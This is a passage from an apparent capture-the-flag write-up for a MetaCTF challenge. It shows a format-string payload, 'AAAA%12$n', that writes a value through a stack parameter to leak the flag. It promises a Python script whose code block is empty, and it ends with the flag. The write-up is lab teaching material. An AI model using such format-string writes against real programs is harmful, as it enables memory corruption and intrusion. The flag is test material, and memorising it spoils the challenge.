Let's try with AAAA%12$n, meaning: *write the length of 'AAAA' (4) as 12th parameter*, this works and we will leak the flag.

Curiously enough, this challenge was solvable directly from the terminal by copy-pasting those 2 needed inputs, but here we write a more elegant way with a Python script: 
```python
```
**MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}**
